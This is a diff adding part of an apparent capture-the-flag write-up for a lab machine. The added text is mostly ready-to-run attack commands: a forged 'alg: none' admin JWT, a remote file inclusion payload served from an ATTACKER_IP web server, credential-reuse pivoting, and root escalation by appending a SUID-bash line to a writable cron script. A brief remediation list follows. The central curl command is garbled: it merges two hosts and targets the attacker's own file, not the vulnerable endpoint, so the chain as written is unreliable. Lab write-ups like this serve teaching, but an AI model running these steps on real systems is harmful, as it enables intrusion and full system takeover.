@@ -347,6 +347,115 @@ curl -s http://10.49.148 -H "Cookie: nexus_session=[INTERCEPTED_JWT]"
 * **Parameter Exploitation (`?id=1`):** Interrogates the backend user index mapping, specifically forcing the database engine to pull record row `1` (Admin).
 * **Identity Spoofing Flag (`-H "Cookie: ..."`):** Feeds the cryptographically valid administrative cookie directly into the application context window, establishing instant authentication authorization.
 
+## Exploit Chain: Remote Code Execution via JWT Bypass & RFI (Flag 3)
+
+### 1. Vulnerability Analysis
+* **Flaw 1 (Broken JWT Validation):** The API utility at `/api/files.php` enforces JSON Web Token (JWT) verification but accepts tokens with the algorithm header set to `"none"`. This allows an attacker to forge an administrative token without a valid cryptographic signature.
+* **Flaw 2 (Remote File Inclusion):** The `?name=` parameter insecurely parses input data via a backend processing loop (`eval`), allowing execution of remote scripts if an absolute URL is supplied.
+
+### 2. Exploitation Steps
+
+#### Step A: Stage the Payload Locally
+On the attacking machine, create a plaintext payload file (`shell.txt`) containing the command to read the flag. The backend script strips `<?php` tags, so raw system interaction functions must be supplied directly:
+
+```bash
+echo "system('cat /opt/flag3.txt');" > shell.txt
+```
+
+#### Step B: Start an Attacker Web Server
+Expose the directory containing the payload file over the local network using a temporary Python web utility:
+
+```bash
+python3 -m http.server 8000
+```
+
+#### Step C: Execute the Attack Chain
+Open a separate terminal window. Execute a `curl` request containing the forged, unsigned administrator token (`alg: none`) within the `Authorization` header, forcing the target to pull and execute the hosted payload:
+
+```bash
+curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ." "http://10.49.157<ATTACKER_IP>:8000/shell.txt"
+```
+*(Note: Replace `<ATTACKER_IP>` with your local VPN tunnel IP address, e.g., `10.49.87.251`).*
+
+### 3. Execution Result
+The target backend validates the forged token, successfully processes the request as administrator `laura.hayes`, fetches the remote `shell.txt` payload, and executes the system execution function. The value of the flag at `/opt/flag3.txt` is rendered directly in the terminal output interface.
+
+## Exploit Chain: Lateral Movement & Privilege Escalation (Flags 2 & 1)
+
+### 1. Lateral Movement to DevOps User (Flag 2)
+
+#### Vulnerability Analysis
+* **Credential Reuse:** Development configurations within the web root exposed hardcoded database connection credentials. These credentials were used across different system authentication contexts, allowing an attacker with an initial web-shell footprint (`www-data`) to pivot directly onto local system accounts.
+
+#### Exploitation Steps
+
+##### Step A: Enumerate Environment Configurations
+From the initial interactive reverse shell session running as `www-data`, audit the application structure to locate database or deployment configuration parameters:
+```bash
+cat /var/www/html/config.php
+```
+*(Note: Locate the hardcoded password variable string defined within the database connection function).*
+
+##### Step B: Upgrade to an Interactive Terminal
+Standard reverse shell connections lack terminal allocation controls (`TTY`), which blocks interactive utility prompts like `su`. Spawn a clean pseudo-terminal wrapper using Python:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+##### Step C: Pivot to the target profile
+Authenticate directly to the `devops` interactive user account via password reuse:
+```bash
+su devops
+```
+*(When prompted, supply the credential string discovered inside the configuration script).*
+
+##### Step D: Retrieve User Flag
+Navigate into the home directory structure to print out the second asset token:
+```bash
+cat /home/devops/user.txt
+```
+
+---
+
+### 2. Privilege Escalation to Root (Flag 1)
+
+#### Vulnerability Analysis
+* **Weak File Permissions on Automated System Tasks:** A diagnostic utility script executed automatically on a periodic routine (`cron`) under administrative root constraints. However, the script's access controls were misconfigured, allowing write permissions to any member belonging to the `devops` system group.
+
+#### Exploitation Steps
+
+##### Step A: Identify Write-Accessible Automated Scripts
+Audit directories handling operations utilities to find files modifiable by the active group profile:
+```bash
+find /opt -writable 2>/dev/null
+```
+The scan isolates an active routine script at `/opt/monitoring/health_report.sh`.
+
+##### Step B: Inject SUID Shell Privilege Payload
+Append a directive onto the end of the script to assign Set User ID (`SUID`) attributes onto the native system shell execution wrapper upon its next runtime loop:
+```bash
+echo "chmod +s /usr/bin/bash" >> /opt/monitoring/health_report.sh
+```
+
+##### Step C: Spawning the Privileged Session
+Allow roughly 60 seconds for the system automation framework to cycle. Once the root process reads and executes the modified shell script, execute the shell application wrapper while maintaining its newly inherited permissions:
+```bash
+bash -p
+```
+*(Verify identity elevation by executing the `id` or `whoami` commands).*
+
+##### Step D: Retrieve Root Flag
+Access the system administrator's protected storage area to view the final validation asset:
+```bash
+cat /root/root.txt
+```
+
+---
+
+### 🛡️ Defensive Remediation Summary
+* **Implement Strong Access Control Lists (ACLs):** Restrict modification capabilities on automated system processes exclusively to administrative owners (`root`). Revoke general group write properties on binary pathways.
+* **Isolate Service Identities:** Enforce separate, unique passwords for application database connections, network service profiles, and local system terminal accounts to prevent fast lateral pivoting.
+
 
 
 
